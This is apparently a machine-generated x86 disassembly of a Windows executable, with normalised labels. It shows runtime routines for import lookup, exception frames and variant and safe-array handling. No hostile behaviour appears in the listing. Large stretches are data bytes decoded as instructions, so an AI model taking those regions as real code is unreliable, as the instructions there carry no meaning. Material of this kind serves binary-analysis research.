push ebx
mov ebx edx
mov edx ebx
mov ecx [ ebp + 0x8 ]
cmp [ ecx - 0x4 ] 0x0
je r-xdata
mov eax edx
pop ebx
pop ebp
retn
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
push eax
call GetProcAddress
mov edx eax
test edx edx
jne r-xdata
mov edx ebx
sub_40dc90
push ebp
mov ebp esp
push ecx
push r-xdata
call GetModuleHandleA
mov [ ebp - 0x4 ] eax
push ebp
mov edx sub_40d800
mov eax r-xdata
call sub_40dc64
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d830
mov eax r-xdata
call sub_40dc64
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d830
mov eax r-xdata
call sub_40dc64
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d83c
mov eax r-xdata
call sub_40dc64
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d83c
mov eax r-xdata
call sub_40dc64
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d83c
mov eax r-xdata
call sub_40dc64
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d83c
mov eax r-xdata
call sub_40dc64
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d83c
mov eax r-xdata
call sub_40dc64
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d83c
mov eax r-xdata
call sub_40dc64
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d83c
mov eax r-xdata
call sub_40dc64
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d83c
mov eax r-xdata
call sub_40dc64
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d83c
mov eax r-xdata
call sub_40dc64
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d848
mov eax r-xdata
call sub_40dc64
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d854
mov eax r-xdata
call sub_40dc64
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d8c0
mov eax r-xdata
call sub_40dc64
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d92c
mov eax r-xdata
call sub_40dc64
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40d998
mov eax r-xdata
call sub_40dc64
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da04
mov eax r-xdata
call sub_40dc64
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40da70
mov eax r-xdata
call sub_40dc64
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40daf0
mov eax r-xdata
call sub_40dc64
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40db60
mov eax r-xdata
call sub_40dc64
pop ecx
mov [ rw-data ] eax
push ebp
mov edx sub_40dbd0
mov eax r-xdata
call sub_40dc64
pop ecx
mov [ rw-data ] eax
pop ecx
pop ebp
retn
sub_40df9c
push ebp
mov ebp esp
xor eax eax
push ebp
push sub_40dfc1
push [ fs : eax ]
mov [ fs : eax ] esp
inc [ rw-data ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40dfc8
retn
sub_40e0fc
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc esp
loope r-xdata
nop
add [ eax + eax ] cl
add [ eax ] al
cwde
jbe r-xdata
loop r-xdata
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax + 0xc0040e1 ] ch
add [ eax ] al
add [ eax + 0x6c004076 ] bl
xor eax [ eax ]
js r-xdata
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
add al bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax - 0x1e ] dh
inc ebp
jb r-xdata
jo r-xdata
popad
outsb
je r-xdata
inc ecx
jb r-xdata
insb
outsd
ja r-xdata
add [ eax ] al
xor [ eax ] al
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
jo r-xdata
outsd
jb r-xdata
popad
jae r-xdata
inc ebx
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x70795474
add [ ebx + esi + 0x40 ] dh
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
outsb
jbe r-xdata
outsd
inc ebp
jb r-xdata
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
jb r-xdata
jb r-xdata
add [ eax + eax ] cl
add [ eax ] al
cwde
jbe r-xdata
push esi
popad
jb r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc eax
add [ eax + eax ] cl
add [ eax ] al
cwde
jbe r-xdata
ror [ edx ] 0x40
jns r-xdata
insb
imul esp [ edi + ecx * 2 + 0x70 ] 0x6f727245
xor eax [ eax ]
je r-xdata
jecxz r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
cmp bl ah
inc eax
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
aam 0xe2
inc eax
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
jecxz r-xdata
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
adc eax 0x72615645
jns r-xdata
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
add [ ebx + esi + 0x40 ] dh
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
outsb
jbe r-xdata
jo r-xdata
inc ebx
popad
jb r-xdata
test al 0xe1
inc eax
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebx + 0xc0040 ] bl
imul esp [ ecx + 0x6e ] 0x64614274
dec ecx
inc eax
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
inc eax
add [ 0x72615645 ] dl
add al bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
xor [ eax ] al
adc al 0x31
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
xor eax [ eax ]
je r-xdata
loop r-xdata
popad
outsb
je r-xdata
shl [ eax - 0x1e ] 0x40
rcr [ ebx + 0x40 ] 0x0
add [ eax + eax ] cl
add [ eax ] al
cwde
jbe r-xdata
outsb
js r-xdata
dec ecx
popad
outsb
je r-xdata
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
inc ebp
jb r-xdata
popad
insb
imul esp [ ecx + eax * 2 + 0x72 ] 0x72724567
adc al 0x31
add [ eax ] al
add [ eax ] al
inc eax
jb r-xdata
popad
outsb
je r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp ] al
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add ah dl
loop r-xdata
inc eax
xor [ eax ] al
adc al 0x31
add al bl
add [ eax ] al
add [ eax ] al
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x65764f74
jb r-xdata
inc eax
add [ ecx + esi ] dl
jl r-xdata
outsb
je r-xdata
popad
outsb
je r-xdata
inc eax
add [ eax + eax ] cl
add [ eax ] al
cwde
jbe r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al 0xe4
outsd
jb r-xdata
outsd
jb r-xdata
add [ eax ] al
cwde
jbe r-xdata
add [ eax + eax ] cl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
pushfd
jecxz r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ edx ] cl
inc eax
add [ eax + eax ] cl
add [ eax ] al
cwde
jbe r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
test al 0xe1
inc eax
add [ eax + eax ] cl
add [ eax ] al
cwde
jbe r-xdata
add [ eax ] al
lea eax [ eax ]
inc esp
loope r-xdata
add [ eax ] al
add [ ebx + esi + 0x40 ] ch
add [ eax ] al
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
inc eax
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
jb r-xdata
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
jb r-xdata
inc eax
add [ esp ] al
inc eax
add [ eax ] al
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
xor [ eax ] al
adc al 0x31
inc eax
add [ esi ] dl
inc ebp
push esi
popad
jb r-xdata
add al bl
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ecx + 0x40 ] al
add [ eax ] al
add [ ebx + esi + 0x40 ] ch
outsb
je r-xdata
popad
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
outsd
inc eax
add al dl
in al 0x40
add [ eax ] al
add [ eax ] al
popad
jb r-xdata
popad
jns r-xdata
add [ eax ] al
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
outsb
je r-xdata
popad
outsb
je r-xdata
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
inc eax
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
insd
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ eax * 2 + 0x69726156 ] dl
inc eax
jb r-xdata
jb r-xdata
inc eax
add [ eax ] bl
inc ebp
push esi
popad
jb r-xdata
add [ eax + esi + 0x30d80040 ] bh
inc eax
add [ ecx + esi ] dl
outsd
arpl [ ebx + 0x65 ] bp
inc ebp
jb r-xdata
add [ eax ] al
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
add [ ecx + esi ] dl
outsb
js r-xdata
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
inc eax
add [ edi ] dl
inc ebp
push esi
popad
jb r-xdata
jne r-xdata
jb r-xdata
inc ebp
jo r-xdata
popad
je r-xdata
inc eax
add [ esp + 0x40 ] ch
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ esp + 0x40 ] ch
add [ eax + eax ] cl
add [ eax ] al
cwde
jbe r-xdata
push ebp
push sub_40e5fe
push [ fs : eax ]
inc eax
add [ 0x72615645 ] dl
imul esp [ ecx + 0x6e ] 0x73694474
jo r-xdata
add [ ebx + esi + 0x40 ] ch
add [ eax + 0x33 ] bh
inc eax
add [ ebx + esi + 0x40 ] bh
add [ eax + 0x74004033 ] al
xor eax [ eax ]
mov esp 0xd8004030
xor [ eax ] al
adc al 0x31
jae r-xdata
popad
add esp 0xffffffe4
push ebx
je r-xdata
in al dx
arpl [ gs : ebp + 0x64 ] si
inc ebp
jb r-xdata
pushfd
dec edi
dec bp
insd
outsd
jb r-xdata
je r-xdata
inc eax
add [ eax ] bh
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] bh
in eax 0x40
add [ eax + eax ] cl
add [ eax ] al
cwde
jbe r-xdata
outsd
jb r-xdata
jb r-xdata
inc ebp
jb r-xdata
xor eax eax
push ebp
push sub_40e697
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4102f8
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4102f8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_4038b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e69e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f1c
retn
dec ebp
in al 0x8b
mov ebx eax
popad
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
push 0x6f727245
jb r-xdata
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e605
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
add [ edi + edi * 8 + 0x30 ] ah
outsd
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ ebp + 0xc0040 ] bl
add [ eax ] al
cwde
jbe r-xdata
inc ebp
jb r-xdata
jb r-xdata
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
add al dl
in al 0x40
add [ eax + eax ] cl
add [ eax ] al
cwde
jbe r-xdata
outsd
push 0x0
xor eax eax
rcl [ ebp - 0x75 ] 0xec
in eax 0x40
in eax 0x40
add [ eax ] al
add [ eax ] al
add [ eax ] al
add [ eax ] al
outsd
popad
jns r-xdata
sub_40e5b4
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e5fe
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e605
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_40e608
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e697
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4102f8
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4102f8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_4038b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e69e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f1c
retn
sub_40e6a4
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e6ee
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e6f5
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_40e6f8
push ebp
mov ebp esp
add esp 0xffffffe4
push ebx
push esi
xor ecx ecx
mov [ ebp - 0x14 ] ecx
mov [ ebp - 0x18 ] ecx
mov [ ebp - 0x1c ] ecx
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_40e787
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x14 ]
mov eax ebx
call sub_4102f8
mov eax [ ebp - 0x14 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0xb
lea edx [ ebp - 0x18 ]
mov eax esi
call sub_4102f8
mov eax [ ebp - 0x18 ]
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] 0xb
lea eax [ ebp - 0x10 ]
push eax
push 0x1
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_4038b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e78e
lea eax [ ebp - 0x1c ]
mov edx 0x3
call sub_403f1c
retn
sub_40e794
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40e7de
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40e7e5
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_40e7e8
push ebp
mov ebp esp
mov ecx 0x8
push 0x0
push 0x0
dec ecx
jne r-xdata
push ebx
mov ebx eax
xor eax eax
push ebp
push sub_40ea2d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax ebx
cmp eax 0x8002000a
jg r-xdata
sub eax 0x8002000b
je r-xdata
je r-xdata
lea edx [ ebp - 0xc ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0xc ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
jmp r-xdata
sub eax 0x2
je r-xdata
lea edx [ ebp - 0x8 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x8 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
jmp r-xdata
cmp eax 0x80020005
jg r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40ea34
lea eax [ ebp - 0x40 ]
mov edx 0x2
call sub_403f1c
lea eax [ ebp - 0x20 ]
mov edx 0x8
call sub_403f1c
retn
lea edx [ ebp - 0x10 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x10 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
jmp r-xdata
sub eax 0x50001
je r-xdata
sub eax 0x80020008
je r-xdata
je r-xdata
lea edx [ ebp - 0x18 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x18 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
jmp r-xdata
sub eax 0x49
je r-xdata
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
jmp r-xdata
dec eax
je r-xdata
call sub_40e5b4
jmp r-xdata
sub eax 0x80004001
je r-xdata
lea edx [ ebp - 0x1c ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x1c ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
jmp r-xdata
jmp r-xdata
call sub_40e6a4
jmp r-xdata
jmp r-xdata
lea edx [ ebp - 0x14 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x14 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
jmp r-xdata
sub eax 0xbffe
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov [ ebp - 0x38 ] eax
mov [ ebp - 0x34 ] 0xb
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x2c ] 0x0
lea edx [ ebp - 0x3c ]
mov eax ebx
call sub_40ae60
mov eax [ ebp - 0x3c ]
mov [ ebp - 0x28 ] eax
mov [ ebp - 0x24 ] 0xb
lea eax [ ebp - 0x38 ]
push eax
push 0x2
lea edx [ ebp - 0x40 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x40 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b6a4
call sub_4038b0
lea edx [ ebp - 0x20 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x20 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
jmp r-xdata
jmp r-xdata
sub_40ea48
push ebx
test eax eax
je r-xdata
pop ebx
retn
mov ebx eax
sub ebx 0x80020005
je r-xdata
mov eax edx
mov edx ecx
call sub_40e608
jmp r-xdata
sub ebx 0x5
je r-xdata
mov eax edx
mov edx ecx
call sub_40e6f8
jmp r-xdata
jmp r-xdata
call sub_40e7e8
sub_40ea7c
push ebp
mov ebp esp
push 0x0
xor eax eax
push ebp
push sub_40eac6
push [ fs : eax ]
mov [ fs : eax ] esp
lea edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_405a5c
mov ecx [ ebp - 0x4 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40b668
call sub_4038b0
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_40eacd
lea eax [ ebp - 0x4 ]
call sub_403ef8
retn
sub_40eae4
push ebp
mov ebp esp
push ebx
mov ecx [ ebp + 0x8 ]
add ecx 0xfffffd00
mov eax edx
pop ebx
pop ebp
retn
test eax eax
jge r-xdata
mov edx [ ecx + eax * 8 + 0x4 ]
add edx [ ecx + eax * 8 ]
mov ebx [ ebp + 0x8 ]
cmp edx [ ebx + eax * 4 - 0x100 ]
setg dl
dec eax
test dl dl
je r-xdata
sub_40eb14
push ebp
mov ebp esp
push ebx
push esi
mov dl 0x1
mov ecx [ ebp + 0x8 ]
inc [ ecx + eax * 4 - 0x100 ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + eax * 8 - 0x2fc ]
mov ebx ecx
mov esi [ ebp + 0x8 ]
add ebx [ esi + eax * 8 - 0x300 ]
mov esi [ ebp + 0x8 ]
cmp ebx [ esi + eax * 4 - 0x100 ]
jg r-xdata
mov eax edx
pop esi
pop ebx
pop ebp
retn
test eax eax
jne r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ ebp + 0x8 ]
mov [ edx + eax * 4 - 0x100 ] ecx
mov edx [ ebp + 0x8 ]
push edx
dec eax
call sub_40eb14
pop ecx
mov edx eax
xor edx edx
jmp r-xdata
sub_40eb70
push ebp
mov ebp esp
add esp 0xfffffce8
push ebx
push esi
push edi
mov [ ebp - 0x304 ] eax
mov eax [ ebp - 0x304 ]
test [ eax + 0x1 ] 0x20
jne r-xdata
mov eax [ ebp - 0x304 ]
mov ax [ eax ]
mov edx eax
and dx 0xfff
cmp dx 0xc
jne r-xdata
mov eax 0x80070057
call sub_40ea3c
mov eax [ ebp - 0x304 ]
push eax
call VariantClear
call sub_40ea3c
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ ebp - 0x304 ]
test ah 0x40
je r-xdata
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov [ ebp - 0x308 ] eax
mov eax [ ebp - 0x304 ]
mov eax [ eax + 0x8 ]
mov eax [ eax ]
mov [ ebp - 0x308 ] eax
jmp r-xdata
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
inc ebx
xor edi edi
lea esi [ ebp - 0x300 ]
mov eax [ ebp - 0x308 ]
movzx eax [ eax ]
mov [ ebp - 0x310 ] eax
mov ebx [ ebp - 0x310 ]
dec ebx
test ebx ebx
jl r-xdata
push ebp
mov ebx [ ebp - 0x310 ]
dec ebx
mov eax ebx
call sub_40eae4
pop ecx
test al al
je r-xdata
inc ebx
lea eax [ ebp - 0x2fc ]
lea edx [ ebp - 0x100 ]
mov eax esi
mov [ ebp - 0x318 ] eax
mov eax [ ebp - 0x318 ]
add eax 0x4
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetLBound
call sub_40ea3c
lea eax [ ebp - 0x30c ]
push eax
lea eax [ edi + 0x1 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayGetUBound
call sub_40ea3c
mov eax [ ebp - 0x318 ]
mov edx [ ebp - 0x30c ]
sub edx [ eax + 0x4 ]
inc edx
mov eax [ ebp - 0x318 ]
mov [ eax ] edx
inc edi
add esi 0x8
dec ebx
jne r-xdata
push ebp
mov eax ebx
call sub_40eb14
pop ecx
test al al
jne r-xdata
lea eax [ ebp - 0x314 ]
push eax
lea eax [ ebp - 0x100 ]
push eax
mov eax [ ebp - 0x308 ]
push eax
call SafeArrayPtrOfIndex
call sub_40ea3c
mov eax [ ebp - 0x314 ]
call sub_40ed68
mov ecx [ eax ]
mov [ edx ] ecx
add edx 0x4
add eax 0x8
dec ebx
jne r-xdata
sub_40ecec
push ebx
push esi
push ecx
mov ebx eax
mov si [ ebx ]
cmp si 0x14
jae r-xdata
cmp si 0x100
jne r-xdata
push ebx
call VariantClear
call sub_40ea3c
jmp r-xdata
cmp si 0x101
jne r-xdata
mov [ ebx ] 0x0
lea eax [ ebx + 0x8 ]
call sub_403ef8
jmp r-xdata
pop edx
pop esi
pop ebx
retn
test si 0x2000
je r-xdata
mov eax ebx
call [ rw-data ]
jmp r-xdata
mov edx esp
mov eax esi
call sub_410754
test al al
je r-xdata
mov eax ebx
call sub_40eb70
jmp r-xdata
push ebx
call VariantClear
